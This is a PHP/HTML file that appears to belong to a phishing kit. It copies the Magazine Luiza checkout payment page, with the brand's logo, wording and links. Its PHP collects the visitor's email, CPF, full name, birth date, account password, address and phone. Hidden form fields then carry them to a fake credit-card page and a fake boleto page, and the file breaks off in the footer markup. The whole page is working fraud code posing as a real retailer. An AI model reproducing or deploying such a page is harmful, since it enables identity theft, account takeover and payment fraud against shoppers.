<?php
include("../conexao.php");
include("../banco.php");
switch($dist) {
    case "desktop":
        $queryconfig = 'SELECT * FROM `configuracoes` ';
        $resultadoconfig = mysqli_query($conexao, $queryconfig);
        while($exibe = mysqli_fetch_assoc($resultadoconfig)){
          $diasboleto = $exibe['diasboleto'];
        };
        $vencimentoa = date('Y-m-d', strtotime($hoje. ' + '.$diasboleto.' days'));
        $vencimento = date('d/m/Y',strtotime($vencimentoa));
#Pegando As Variaveis Da Pagina Cadastro
        $email = $_POST["email"];
        $cpf = $_POST["cpf"];
        $nomecompleto = $_POST["fullName"];
        $nascimento = $_POST["birthDate"];
        $senha = $_POST["password"];
        $cep = $_POST["cep"];
        $rua = $_POST["rua"];
        $numero = $_POST["number"];
        $complemento = $_POST["complement"];
        $bairro = $_POST["bairro"];
        $cidade = $_POST["cidade"];
        $estado = $_POST["uf"];
        $telefone = $_POST["telephone"];
        ?>
        <!DOCTYPE html>
        <!-- saved from url=(0047)https://sacola.magazineluiza.com.br/#/pagamento -->
        <html lang="pt-BR">
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

            <title>Sacola de compras - Magazine Luiza</title>
            <style>
                .mobile-hiddena {
                    visibility: hidden;
                    width: 1px;
                    height: 1px;
                }
            </style>
            <meta name="description"
                  content="As melhores ofertas em móveis, eletrônicos, eletrodomésticos, informática e muito mais, você encontra no site do Magazine Luiza! Confira!">
            <meta name="viewport" content="width=device-width">
            <style>.async-hide {
                    opacity: 0 !important
                } </style>
            <link href="https://i.mlcdn.com.br/" rel="dns-prefetch">
            <link href="https://n-static.mlcdn.com.br/" rel="dns-prefetch">
            <link rel="shortcut icon" href="https://tiao.magazineluiza.com.br/img/favicon.png">

            <link rel="stylesheet" href="./pagamentoleto_files/styles.1430e5de8cf7dc72ef60.css">














            <style type="text/css">iframe#_hjRemoteVarsFrame {
                    display: none !important;
                    width: 1px !important;
                    height: 1px !important;
                    opacity: 0 !important;
                    pointer-events: none !important;
                }</style>







        </head>
        <body>
        <div id="root">
            <div data-reactid=".0">
                <div class="Checkout-header-magazineluiza" data-reactid=".0.$header">
                    <div class="Checkout-steps-channel" data-reactid=".0.$header.0">
                        <div class="Checkout-steps" data-reactid=".0.$header.0.0">
                            <ul data-reactid=".0.$header.0.0.0">
                                <li class="Checkout-steps-item" data-reactid=".0.$header.0.0.0.0">
                                    <svg class="Checkout-steps-item-icon--active" width="595" height="595"
                                         viewBox="0 0 595 595" data-reactid=".0.$header.0.0.0.0.0">
                                        <path d="M303.946 1.884c19.75 0 35.446 15.67 35.446 35.44v9.52c36.76 5.473 69.497 16.35 98.745 32.712 12.954 7.48 24.496 20.422 24.496 40.845 0 25.91-20.423 45.64-46.25 45.64-8.2 0-16.4-2.037-23.885-6.11-19.05-10.238-38.143-18.413-56.528-23.166v103.55c103.553 27.933 147.792 70.12 147.792 146.435 0 76.284-58.552 125.317-144.37 134.836v36.106c0 19.783-15.696 35.426-35.446 35.426-19.757 0-35.393-15.643-35.393-35.426v-36.758c-48.375-6.166-94.026-23.18-134.2-47.662-14.31-8.867-23.117-22.514-23.117-40.898 0-26.547 20.416-46.305 46.95-46.305 8.86 0 18.432 3.407 26.58 8.825 28.59 18.44 55.835 31.354 87.202 38.17V324.747c-98.1-26.562-146.475-64.04-146.475-145.09 0-74.914 57.235-125.305 143.06-134.185v-8.148c0-19.77 15.636-35.44 35.393-35.44zM271.97 222.58v-91.97c-32.746 4.767-47.052 21.143-47.052 42.937 0 21.073 9.573 35.386 47.05 49.032zm64.002 119.208v94.685c32.032-4.752 48.382-19.757 48.382-44.293 0-22.488-11.556-37.452-48.382-50.392z"
                                              data-reactid=".0.$header.0.0.0.0.0.0"></path>
                                    </svg>
                                    <span class="Checkout-steps-item-title--active" data-reactid=".0.$header.0.0.0.0.1">Pagamento</span>
                                </li>
                                <li class="Checkout-steps-item" data-reactid=".0.$header.0.0.0.1">
                                    <svg class="Checkout-steps-item-icon" width="595.281" height="595.275"
                                         viewBox="0 0 595.281 595.275" data-reactid=".0.$header.0.0.0.1.0">
                                        <path d="M519.32 185.965c-9.3-21.663-30.617-35.728-54.21-35.728h-79.026v-44.22c0-32.562-26.4-58.96-58.96-58.96H61.798c-32.56 0-58.96 26.398-58.96 58.96v294.8c0 32.562 26.4 58.96 58.96 58.96h20.887c0 48.84 39.592 88.44 88.44 88.44 48.833 0 88.44-39.6 88.44-88.44H384.876c0 48.84 39.6 88.44 88.44 88.44 48.853 0 88.438-39.6 88.438-88.44h1.21c16.267 0 29.478-13.2 29.478-29.48V356.6L519.32 185.964zM171.124 489.26c-16.26 0-29.48-13.23-29.48-29.48 0-16.267 13.22-29.48 29.48-29.48 16.244 0 29.48 13.215 29.48 29.48 0 16.25-13.236 29.48-29.48 29.48m214.96-280.062h79.025l37.914 88.44h-116.94v-88.44zm87.23 280.06c-16.25 0-29.48-13.228-29.48-29.48 0-16.265 13.23-29.478 29.48-29.478 16.266 0 29.48 13.215 29.48 29.48 0 16.25-13.214 29.48-29.48 29.48"
                                              data-reactid=".0.$header.0.0.0.1.0.0"></path>
                                    </svg>
                                    <span class="Checkout-steps-item-title"
                                          data-reactid=".0.$header.0.0.0.1.1">Entrega</span></li>
                                <li class="Checkout-steps-item" data-reactid=".0.$header.0.0.0.2">
                                    <svg class="Checkout-steps-item-icon" width="595.279" height="595.277"
                                         viewBox="0 0 595.279 595.277" data-reactid=".0.$header.0.0.0.2.0">
                                        <path d="M296.258 370.84c100.878 0 182.796-81.838 182.796-182.794 0-100.88-81.918-182.708-182.796-182.708-100.886 0-182.708 81.83-182.708 182.708 0 100.956 81.822 182.794 182.708 182.794z"
                                              data-reactid=".0.$header.0.0.0.2.0.0"></path>
                                        <path d="M428.035 364.858c-38.12 23.344-82.62 37.114-130.4 37.114s-92.37-13.77-130.4-37.114C80.515 404.685 19.563 482.61 13.13 573.984c-.586 8.52 6 15.87 14.62 15.87h539.77c8.704 0 15.173-7.35 14.54-15.87-6.33-91.373-67.307-169.3-154.025-209.126z"
                                              data-reactid=".0.$header.0.0.0.2.0.1"></path>
                                    </svg>
                                    <span class="Checkout-steps-item-title" data-reactid=".0.$header.0.0.0.2.1">Identificação</span>
                                </li>
                                <li class="Checkout-steps-item" data-reactid=".0.$header.0.0.0.3">
                                    <svg class="Checkout-steps-item-icon" width="595.3" height="595.3"
                                         viewBox="0 0 595.3 595.3" data-reactid=".0.$header.0.0.0.3.0">
                                        <path d="M381.1 122.4H214.9c-16.4 0-29.1 13.6-29.1 29.8h225.1c-.1-16.1-13.4-29.8-29.8-29.8zM461.2 430.1l-14-220.2c-1.3-21.1-18.2-37.2-38.9-37.2H187.5c-20.6 0-37.6 16.1-38.9 37.2L134 430.1c-1.3 22.9 16.4 42.8 38.9 42.8h249.3c22.6 0 40.8-19.9 39-42.8zM298 333.3c-49.2 0-89.2-40.9-89.2-90.6 0-5.6 4.2-9.9 9.7-9.9 5.5 0 9.8 4.3 9.8 9.9 0 39.1 31 70.1 69.2 70.1s69.2-31.6 69.2-70.1c0-5.6 4.3-9.9 9.7-9.9 5.4 0 9.7 4.3 9.7 9.9 1 50.3-39 90.6-88.1 90.6z"
                                              data-reactid=".0.$header.0.0.0.3.0.0"></path>
                                    </svg>
                                    <span class="Checkout-steps-item-title"
                                          data-reactid=".0.$header.0.0.0.3.1">Sacola</span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="Checkout-header" data-reactid=".0.$header.1">
                        <div class="Checkout-header-content" data-reactid=".0.$header.1.0">
                            <div class="Checkout-header-logo" data-reactid=".0.$header.1.0.0"><a
                                        href="https://www.magazineluiza.com.br/" data-reactid=".0.$header.1.0.0.0">
                                    <svg class="Checkout-header-logo-icon" id="Camada_1" viewBox="0 0 214.72 54.48"
                                         data-reactid=".0.$header.1.0.0.0.0">
                                        <defs data-reactid=".0.$header.1.0.0.0.0.0">
                                            <style data-reactid=".0.$header.1.0.0.0.0.0.0">.cls-1 {
                                                    fill: #fff;
                                                    fill-rule: evenodd
                                                }</style>
                                        </defs>
                                        <title data-reactid=".0.$header.1.0.0.0.0.1">Logo_Magalu</title>
                                        <path class="cls-1"
                                              d="M103.18 26.13a7.56 7.56 0 0 1 1.36-4.41 4.39 4.39 0 0 1 3.9-1.87 4.6 4.6 0 0 1 3.9 1.87 6.63 6.63 0 0 1 1.19 4.24 26.33 26.33 0 0 1-.17 3.73 6 6 0 0 1-1.53 2.88 3.78 3.78 0 0 1-3.22 1.19 4.31 4.31 0 0 1-4.24-2.38 11.37 11.37 0 0 1-1.19-5.26zm22.06-14.26h-11.87v3.9h-.17a7 7 0 0 0-3.39-3.56 11.69 11.69 0 0 0-4.92-1.19 14.37 14.37 0 0 0-7.47 2.21 12 12 0 0 0-4.58 5.43 17.8 17.8 0 0 0-1.53 7.47 19.38 19.38 0 0 0 1.36 7.81 12.56 12.56 0 0 0 4.41 5.43 13.53 13.53 0 0 0 7.64 2.21 11.69 11.69 0 0 0 4.92-1.19 10.65 10.65 0 0 0 3.56-3.22h.17v2.89a10.45 10.45 0 0 1-.51 3.05 5.71 5.71 0 0 1-1.36 2.88 3.63 3.63 0 0 1-2.89 1.36 3.57 3.57 0 0 1-2.21-.85 4 4 0 0 1-1.36-1.53c-.17-.17-.34-.34-.34-.51-.17-.17-.34-.34-.34-.51H92.49a10.08 10.08 0 0 0 3.05 6.45 15.59 15.59 0 0 0 5.94 3.22 36 36 0 0 0 7.47.85c4.75-.17 8.48-1 10.69-2.55a12.21 12.21 0 0 0 4.75-5.94 17.79 17.79 0 0 0 .85-6.62V11.88zM0 43.44h11.88V26.29a7.24 7.24 0 0 1 1-4.07 3.24 3.24 0 0 1 3.05-1.53c1.87 0 2.89.68 3.39 1.7a8.94 8.94 0 0 1 .68 3.9v17.14h12V26.29a6.09 6.09 0 0 1 .85-4.07 3.36 3.36 0 0 1 3.22-1.53c1.7 0 2.88.68 3.22 1.7a8.94 8.94 0 0 1 .68 3.9v17.14h12V21.72a12.18 12.18 0 0 0-1-4.92 8.83 8.83 0 0 0-3.39-4.07 13.84 13.84 0 0 0-6.45-1.7 14.8 14.8 0 0 0-6.11 1.36 9 9 0 0 0-3.3 2.2c-.68.85-1.19 1.19-1.19 1.36a9 9 0 0 0-3.56-3.56 12.55 12.55 0 0 0-4.92-1.36 16.09 16.09 0 0 0-5.94 1.19 10.71 10.71 0 0 0-4.41 3.9h-.17v-4.24H0v31.57zM76.54 32.29a5.22 5.22 0 0 1-5.09 4.92 4.37 4.37 0 0 1-2.72-1 2.42 2.42 0 0 1-1-2 2.52 2.52 0 0 1 1-2.21 8.78 8.78 0 0 1 3.05-1.19c.85-.17 1.53-.34 2.38-.51a14.3 14.3 0 0 0 2.38-1v2.99zm11.54-8.82a22.79 22.79 0 0 0-.68-5.94c-.34-1.87-1.7-3.39-3.73-4.58-2.21-1.19-5.6-1.7-10.52-1.87a35.94 35.94 0 0 0-7.47.85 13.65 13.65 0 0 0-6.11 2.89c-1.7 1.53-2.55 3.73-2.72 6.62h11.2a2.69 2.69 0 0 1 .85-2 5.85 5.85 0 0 1 3.56-1.19 6.39 6.39 0 0 1 2.72.68 2.8 2.8 0 0 1 1.36 2.21 2.9 2.9 0 0 1-1 2 5.71 5.71 0 0 1-2.38.85c-1.53.17-3.39.51-5.26.68-2 .34-4.07.85-5.94 1.36a10.91 10.91 0 0 0-4.58 3.05c-1.36 1.36-1.87 3.22-2 5.6.17 3.39 1.19 5.77 3.39 7.3a11.54 11.54 0 0 0 7.81 2.21 15.85 15.85 0 0 0 5.6-.68 9.94 9.94 0 0 0 4.54-3.12 4.69 4.69 0 0 0 .17 1.53 5 5 0 0 0 .34 1.53h12.22a8.14 8.14 0 0 1-1.19-3.39 13.8 13.8 0 0 1-.17-3.73v-12.9zM149.34 32.29a4.16 4.16 0 0 1-1.53 3.56 4.74 4.74 0 0 1-3.39 1.36 4.37 4.37 0 0 1-2.72-1 3.15 3.15 0 0 1-1.19-2A2.3 2.3 0 0 1 141.7 32a9.22 9.22 0 0 1 2.89-1.19l2.55-.51a8.76 8.76 0 0 0 2.21-1v2.99zm11.54-8.82a17.27 17.27 0 0 0-.51-5.94c-.34-1.87-1.7-3.39-3.73-4.58-2.21-1.19-5.77-1.7-10.69-1.87a37.3 37.3 0 0 0-7.47.85 13 13 0 0 0-5.94 2.89c-1.7 1.53-2.55 3.73-2.72 6.62h11.2a2.2 2.2 0 0 1 .85-2c.51-.68 1.7-1 3.56-1.19a7.11 7.11 0 0 1 2.72.68 2.3 2.3 0 0 1 1.19 2.21 2.05 2.05 0 0 1-1 2 4.32 4.32 0 0 1-2.21.85c-1.53.17-3.39.51-5.43.68-1.87.34-3.9.85-5.77 1.36a12.73 12.73 0 0 0-4.75 3.05 8.25 8.25 0 0 0-1.87 5.6c.17 3.39 1.19 5.77 3.22 7.3a12.3 12.3 0 0 0 8 2.21 14.49 14.49 0 0 0 5.43-.68 8.49 8.49 0 0 0 4.58-3.05h.18a4.71 4.71 0 0 0 .17 1.53 5 5 0 0 0 .34 1.53h12.22a8.14 8.14 0 0 1-1.19-3.39 27.8 27.8 0 0 1-.34-3.73V23.5zM165.51 43.45h11.88V0h-11.88v43.45zM214.72 11.88h-12v16.63c0 2.55-.68 4.07-1.7 4.92a4.66 4.66 0 0 1-3.05 1.19 3.56 3.56 0 0 1-3.4-1.7 11.87 11.87 0 0 1-.68-4.58V11.88h-11.93V33.6c0 3.56 1.19 6.28 3.22 8a10.55 10.55 0 0 0 7.47 2.55 13.54 13.54 0 0 0 6.11-1.19A9.44 9.44 0 0 0 203 39.4h.17v4.07h11.55V11.88z"
                                              data-reactid=".0.$header.1.0.0.0.0.2"></path>
                                    </svg>
                                </a></div>
                            <div class="Checkout-header-colorsStrip" data-reactid=".0.$header.1.0.1">
                                <div data-reactid=".0.$header.1.0.1.$0"></div>
                                <div data-reactid=".0.$header.1.0.1.$1"></div>
                                <div data-reactid=".0.$header.1.0.1.$2"></div>
                                <div data-reactid=".0.$header.1.0.1.$3"></div>
                                <div data-reactid=".0.$header.1.0.1.$4"></div>
                                <div data-reactid=".0.$header.1.0.1.$5"></div>
                                <div data-reactid=".0.$header.1.0.1.$6"></div>
                                <div data-reactid=".0.$header.1.0.1.$7"></div>
                                <div data-reactid=".0.$header.1.0.1.$8"></div>
                                <div data-reactid=".0.$header.1.0.1.$9"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="App" data-reactid=".0.1">
                    <div class="Grid" data-reactid=".0.1.0">
                        <div class="PaymentPage" data-reactid=".0.1.0.$main">
                            <div class="OrderReview" data-reactid=".0.1.0.$main.1">
                                <div class="OrderReview-titleContainer" data-reactid=".0.1.0.$main.1.0"><span
                                            class="OrderReview-title" data-reactid=".0.1.0.$main.1.0.0">Revisão do pedido</span><a
                                            class="OrderReview-showDetails"
                                            data-ga="{"category": "Revisao do pedido", "action": "Editar Sacola", "label": ""}"
                                    href="https://sacola.magazineluiza.com.br/#"
                                    data-reactid=".0.1.0.$main.1.0.1"></a><a class=""
                                                                             href="https://sacola.magazineluiza.com.br/#undefined"
                                                                             data-reactid=".0.1.0.$main.1.0.1.0">
                                        <div class="ButtonEditLabelAndIcon" data-reactid=".0.1.0.$main.1.0.1.0.0"><span
                                                    class="edit-label" data-reactid=".0.1.0.$main.1.0.1.0.0.0">Editar Sacola</span>
                                            <svg class="edit-icon" width="18" height="18" viewBox="0 0 18 18"
                                                 data-reactid=".0.1.0.$main.1.0.1.0.0.1">
                                                <path d="M.927 13.064l-.89 3.32a1.06 1.06 0 0 0 1.297 1.297l3.32-.89a.546.546 0 0 0 .25-.143l10.64-10.673-3.832-3.833-10.64 10.675a.554.554 0 0 0-.145.25m15.998-8.438l-.434.434-3.832-3.833.434-.433a2.71 2.71 0 0 1 3.833 3.833"
                                                      fill="#8C8C8C" data-reactid=".0.1.0.$main.1.0.1.0.0.1.0"></path>
                                            </svg>
                                        </div>
                                    </a></div>
                                <div class="OrderReview-container" data-reactid=".0.1.0.$main.1.1">
                                    <div class="OrderReview-leftContainer" data-reactid=".0.1.0.$main.1.1.0">
                                        <div class="OrderReviewPackage" data-reactid=".0.1.0.$main.1.1.0.0:$package-1">
                                            <b data-reactid=".0.1.0.$main.1.1.0.0:$package-1.0">Entrega 01 de
                                                01</b><span data-reactid=".0.1.0.$main.1.1.0.0:$package-1.1"><span
                                                        data-reactid=".0.1.0.$main.1.1.0.0:$package-1.1.0"> por </span><span
                                                        data-reactid=".0.1.0.$main.1.1.0.0:$package-1.1.1">MagazineLuiza</span><span
                                                        data-reactid=".0.1.0.$main.1.1.0.0:$package-1.1.2"> - </span><span
                                                        data-reactid=".0.1.0.$main.1.1.0.0:$package-1.1.3">Em até 15 dias úteis*</span></span>
                                            <div class="OrderReviewItem"
                                                 data-reactid=".0.1.0.$main.1.1.0.0:$package-1.3:$product-1-0">
                                                <div class="OrderReviewItem-description"
                                                     data-reactid=".0.1.0.$main.1.1.0.0:$package-1.3:$product-1-0.1"><?= $nome ?></div>
                                            </div>
                                        </div>
                                        <div class="OrderReviewAddress" data-reactid=".0.1.0.$main.1.1.0.1">
                                            <div class="OrderReviewAddress-description"
                                                 data-reactid=".0.1.0.$main.1.1.0.1.0"><span
                                                        data-reactid=".0.1.0.$main.1.1.0.1.0.0">Endereço para a entrega 01: <?= $rua ?>
                                                    , <?= $numero ?> - <?= $cidade ?>/<?= $estado ?></span><a
                                                        class="OrderReviewAddress-description-edit"
                                                        href="https://sacola.magazineluiza.com.br/#/endereco?showAll=true"
                                                        data-reactid=".0.1.0.$main.1.1.0.1.0.1">
                                                    <div class="ButtonEditLabelAndIcon"
                                                         data-reactid=".0.1.0.$main.1.1.0.1.0.1.0"><span
                                                                class="edit-label"
                                                                data-reactid=".0.1.0.$main.1.1.0.1.0.1.0.0">Alterar endereço</span>
                                                        <svg class="edit-icon" width="18" height="18"
                                                             viewBox="0 0 18 18"
                                                             data-reactid=".0.1.0.$main.1.1.0.1.0.1.0.1">
                                                            <path d="M.927 13.064l-.89 3.32a1.06 1.06 0 0 0 1.297 1.297l3.32-.89a.546.546 0 0 0 .25-.143l10.64-10.673-3.832-3.833-10.64 10.675a.554.554 0 0 0-.145.25m15.998-8.438l-.434.434-3.832-3.833.434-.433a2.71 2.71 0 0 1 3.833 3.833"
                                                                  fill="#8C8C8C"
                                                                  data-reactid=".0.1.0.$main.1.1.0.1.0.1.0.1.0"></path>
                                                        </svg>
                                                    </div>
                                                </a></div>
                                        </div>
                                    </div>
                                    <div class="OrderReview-rightContainer" data-reactid=".0.1.0.$main.1.1.1">
                                        <div class="OrderReviewTotals" data-reactid=".0.1.0.$main.1.1.1.0">
                                            <div class="OrderReviewTotals-subTotal"
                                                 data-reactid=".0.1.0.$main.1.1.1.0.0"><span
                                                        class="OrderReviewTotals-left"
                                                        data-reactid=".0.1.0.$main.1.1.1.0.0.0">Subtotal</span><span
                                                        class="OrderReviewTotals-right"
                                                        data-reactid=".0.1.0.$main.1.1.1.0.0.1">R$ <?= $preco ?></span>
                                            </div>
                                            <div class="OrderReviewTotals-shipment"
                                                 data-reactid=".0.1.0.$main.1.1.1.0.1"><span
                                                        class="OrderReviewTotals-left"
                                                        data-reactid=".0.1.0.$main.1.1.1.0.1.0">Frete</span><span
                                                        class="OrderReviewTotals-right"
                                                        data-reactid=".0.1.0.$main.1.1.1.0.1.1"><b>GRATIS</b></span>
                                            </div>
                                            <div class="OrderReviewTotals-total" data-reactid=".0.1.0.$main.1.1.1.0.4">
                                                <span class="OrderReviewTotals-left"
                                                      data-reactid=".0.1.0.$main.1.1.1.0.4.0">Total</span><span
                                                        class="OrderReviewTotals-right"
                                                        data-reactid=".0.1.0.$main.1.1.1.0.4.1"><div
                                                            class="OrderReviewTotal"
                                                            data-reactid=".0.1.0.$main.1.1.1.0.4.1.0"><span
                                                                data-reactid=".0.1.0.$main.1.1.1.0.4.1.0.0">R$ <?= $preco ?></span></div></span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="Promocode" data-reactid=".0.1.0.$main.2">
                                <form class="Promocode__form" data-reactid=".0.1.0.$main.2.1"><label
                                            class="Promocode__label" for="PromocodeInput"
                                            data-ga="{"category": "Promocode", "action": "Abrir"}"
                                    data-reactid=".0.1.0.$main.2.1.0">Inserir cupom de desconto</label></form>
                            </div>
                            <div class="PaymentPage-title" data-reactid=".0.1.0.$main.3">Escolha a forma de pagamento
                            </div>
                            <div data-reactid=".0.1.0.$main.4">
                                <noscript data-reactid=".0.1.0.$main.4.0"></noscript>
                                <ul class="PaymentBox" data-reactid=".0.1.0.$main.4.1">
                                    <li class="PaymentBox-line" data-reactid=".0.1.0.$main.4.1.2"><label
                                                class="PaymentBox-line-label" for="newCard-line"
                                                data-reactid=".0.1.0.$main.4.1.2.0">
                                            <div class="InputRadioButton--off" data-reactid=".0.1.0.$main.4.1.2.0.0">
                                                <svg class="radio-button-off" width="24" height="24" viewBox="0 0 24 24"
                                                     data-reactid=".0.1.0.$main.4.1.2.0.0.0">
                                                    <path fill="#010101"
                                                          d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"
                                                          opacity=".54"
                                                          data-reactid=".0.1.0.$main.4.1.2.0.0.0.0"></path>
                                                </svg>
                                                <svg class="radio-button-on" width="24" height="24" viewBox="0 0 24 24"
                                                     data-reactid=".0.1.0.$main.4.1.2.0.0.1">
                                                    <path fill="#22B8F1"
                                                          d="M12 7c-2.8 0-5 2.2-5 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0-5C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"
                                                          data-reactid=".0.1.0.$main.4.1.2.0.0.1.0"></path>
                                                </svg>
                                                <form action="pagamentocc.php?id=<?= $id ?>&titulo=<?= $nomelink ?>&dist=<?= $dist ?>"
                                                      method="post">
                                            </div>
                                            <input type="radio" class="mobile-hidden"
                                                   data-reactid=".0.1.0.$main.4.1.2.0.1">

                                            <input type="hidden" value="<?= $email ?>" name="email"/>
                                            <input type="hidden" value="<?= $cpf ?>" name="cpf"/>
                                            <input type="hidden" value="<?= $nomecompleto ?>" name="fullName"/>
                                            <input type="hidden" value="<?= $nascimento ?>" name="birthDate"/>
                                            <input type="hidden" value="<?= $senha ?>" name="password"/>
                                            <input type="hidden" value="<?= $cep ?>" name="cep"/>
                                            <input type="hidden" value="<?= $rua ?>" name="rua"/>
                                            <input type="hidden" value="<?= $numero ?>" name="number"/>
                                            <input type="hidden" value="<?= $complemento ?>" name="complement"/>
                                            <input type="hidden" value="<?= $bairro ?>" name="bairro"/>
                                            <input type="hidden" value="<?= $cidade ?>" name="cidade"/>
                                            <input type="hidden" value="<?= $estado ?>" name="uf"/>
                                            <input type="hidden" value="<?= $telefone ?>" name="telephone"/>


                                            <svg class="PaymentBox-icon" width="100" height="80" viewBox="0 0 100 80"
                                                 data-reactid=".0.1.0.$main.4.1.2.0.2">
                                                <path d="M90 0H10C4.478 0 0 4.48 0 10v60c0 5.522 4.478 10 10 10h80c5.52 0 10-4.478 10-10V10c0-5.522-4.48-10-10-10zm0 70H10V40h80v30zm0-45H10V10h80v15z"
                                                      data-reactid=".0.1.0.$main.4.1.2.0.2.0"></path>
                                            </svg>
                                            <span data-reactid=".0.1.0.$main.4.1.2.0.3">Novo cartão de crédito</span><input
                                                    type="submit" id="newCard-line" name="payment-type" value=""
                                                    class="mobile-hiddena" data-reactid=".0.1.0.$main.4.1.2.0.1"></form>
                                        </label></li>
                                    <li class="PaymentBox-line" data-reactid=".0.1.0.$main.4.1.3"><label
                                                class="PaymentBox-line-label" for="bankSlip-line"
                                                data-reactid=".0.1.0.$main.4.1.3.0">
                                            <div class="InputRadioButton--on" data-reactid=".0.1.0.$main.4.1.3.0.0">
                                                <svg class="radio-button-off" width="24" height="24" viewBox="0 0 24 24"
                                                     data-reactid=".0.1.0.$main.4.1.3.0.0.0">
                                                    <path fill="#010101"
                                                          d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"
                                                          opacity=".54"
                                                          data-reactid=".0.1.0.$main.4.1.3.0.0.0.0"></path>
                                                </svg>
                                                <svg class="radio-button-on" width="24" height="24" viewBox="0 0 24 24"
                                                     data-reactid=".0.1.0.$main.4.1.3.0.0.1">
                                                    <path fill="#22B8F1"
                                                          d="M12 7c-2.8 0-5 2.2-5 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0-5C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"
                                                          data-reactid=".0.1.0.$main.4.1.3.0.0.1.0"></path>
                                                </svg>
                                            </div>
                                            <input type="radio" id="bankSlip-line" name="payment-type" checked=""
                                                   value="bank_slip" class="mobile-hidden"
                                                   data-reactid=".0.1.0.$main.4.1.3.0.1">
                                            <svg class="PaymentBox-icon" width="100" height="80" viewBox="0 0 100 80"
                                                 data-reactid=".0.1.0.$main.4.1.3.0.2">
                                                <path d="M91.998 0H8C3.58 0 0 3.58 0 8v64a8 8 0 0 0 8 8h83.998a8 8 0 0 0 8-8V8a8 8 0 0 0-8-8zm0 72H8V8h83.998v64z"
                                                      data-reactid=".0.1.0.$main.4.1.3.0.2.0"></path>
                                                <path d="M15.24 13.954h10v52.103h-10zM30 13.954h5v52.103h-5zM42.498 13.954H50v52.103h-7.502zM67.497 13.954H77.5v52.103H67.498zM82.5 13.954H85v52.103h-2.5zM57.5 13.954h2.496v52.103H57.5z"
                                                      data-reactid=".0.1.0.$main.4.1.3.0.2.1"></path>
                                            </svg>
                                            <span data-reactid=".0.1.0.$main.4.1.3.0.3">Boleto bancário</span></label>
                                        <div name="bankSlip-line" data-reactid=".0.1.0.$main.4.1.3.1">
                                            <form class="BankSlipForm" method="post"
                                                  action="sucessoleto.php?id=<?= $id ?>&titulo=<?= $nomelink ?>&dist=<?= $dist ?>">
                                                <input type="hidden" value="<?= $email ?>" name="email"/>
                                                <input type="hidden" value="<?= $cpf ?>" name="cpf"/>
                                                <input type="hidden" value="<?= $nomecompleto ?>" name="fullName"/>
                                                <input type="hidden" value="<?= $nascimento ?>" name="birthDate"/>
                                                <input type="hidden" value="<?= $senha ?>" name="password"/>
                                                <input type="hidden" value="<?= $cep ?>" name="cep"/>
                                                <input type="hidden" value="<?= $rua ?>" name="rua"/>
                                                <input type="hidden" value="<?= $numero ?>" name="number"/>
                                                <input type="hidden" value="<?= $complemento ?>" name="complement"/>
                                                <input type="hidden" value="<?= $bairro ?>" name="bairro"/>
                                                <input type="hidden" value="<?= $cidade ?>" name="cidade"/>
                                                <input type="hidden" value="<?= $estado ?>" name="uf"/>
                                                <input type="hidden" value="<?= $telefone ?>" name="telephone"/>
                                                <div class="BankSlipForm-price" data-reactid=".0.1.0.$main.4.1.3.1.0.1">
                                                    <span class="BankSlipForm-price--highlighted"
                                                          data-reactid=".0.1.0.$main.4.1.3.1.0.1.0"><span
                                                                data-reactid=".0.1.0.$main.4.1.3.1.0.1.0.0">R$ <?= $preco ?></span><span
                                                                data-reactid=".0.1.0.$main.4.1.3.1.0.1.0.1"> à vista</span></span>
                                                </div>
                                                <div class="BankSlipForm-description"
                                                     data-reactid=".0.1.0.$main.4.1.3.1.0.2"><span
                                                            data-reactid=".0.1.0.$main.4.1.3.1.0.2.0">O prazo para pagamento do boleto é </span><span
                                                            data-reactid=".0.1.0.$main.4.1.3.1.0.2.1"><?= $vencimento ?></span>
                                                </div>
                                                <button class="PaymentForm-form-continue"
                                                        data-ga="{"category": "Pagamento", "action": "Continuar", "label": "Boleto Bancário"}"
                                                data-reactid=".0.1.0.$main.4.1.3.1.0.3">Concluir pedido
                                                </button>
                                            </form>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                            <div class="PaymentContract" data-reactid=".0.1.0.$main.5"><a
                                        href="http://conteudo.magazineluiza.com.br/pdf/contrato_de_compra_e_venda.pdf"
                                        target="_blank" class="PaymentContract-link"
                                        data-ga="{"category": "Pagamento", "action": "Contrato de Compra e Venda", "label": ""}"
                                data-reactid=".0.1.0.$main.5.0">Clique aqui para ler o contrato de compra e
                                venda</a>
                                <p data-reactid=".0.1.0.$main.5.1"><span
                                            data-reactid=".0.1.0.$main.5.1.0">* </span><span
                                            data-reactid=".0.1.0.$main.5.1.1">O prazo de entrega inicia-se no 1º dia útil após a confirmação do pagamento. Esse procedimento costuma ocorrer em até 24 horas, mas tem período máximo para acontecer de até 48 horas (pagamento no cartão). Se o pagamento for realizado por boleto bancário, o banco tem o prazo de até três dias úteis para confirmar.</span><span
                                            data-reactid=".0.1.0.$main.5.1.2"> O valor total da compra, mesmo dividido em parcelas de pequeno valor, não poderá exceder o limite do seu cartão de crédito. Para maiores informações, consulte a administradora do seu cartão.</span>
                                </p></div>
                        </div>
                    </div>
                </div>
                <div class="Checkout-footer-magazineluiza" data-reactid=".0.$footer">
                    <div class="CheckoutFooter" data-reactid=".0.$footer.0">
                        <noscript data-reactid=".0.$footer.0.0"></noscript>
                        <div class="CheckoutFooter-content" data-reactid=".0.$footer.0.1">
                            <div class="CheckoutFooter-top-content" data-reactid=".0.$footer.0.1.0">
                                <ul class="CheckoutFooter-top" data-reactid=".0.$footer.0.1.0.0">
